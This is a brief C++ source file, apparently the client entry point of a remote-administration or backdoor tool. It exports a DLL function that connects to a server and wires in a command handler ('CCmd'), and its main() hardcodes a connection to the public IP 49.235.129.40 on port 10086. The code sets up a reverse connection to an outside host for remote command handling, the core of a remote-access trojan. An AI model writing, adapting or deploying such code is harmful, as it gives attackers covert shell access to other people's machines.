#include "IOCPClient.h"
#include "Manager.h"
#include "Cmd.h"

extern "C" __declspec(dllexport) void  ModuleEntry(char* szServerAddr,
	unsigned short uPort, DWORD dwParam = 0){

	CManager *pManager = new CManager();

	CIOCPClient *pClient = new CIOCPClient(pManager,
		szServerAddr, uPort);

	CMsgHandler *pHandler = new CCmd(pManager);

	pManager->Associate(pClient, pHandler);
	pClient->Run();

	delete pHandler;
	delete pClient;
	delete pManager;
}

int main(){
	CIOCPClient::SocketInit();
	ModuleEntry("49.235.129.40", 10086);
	CIOCPClient::SocketTerm();
}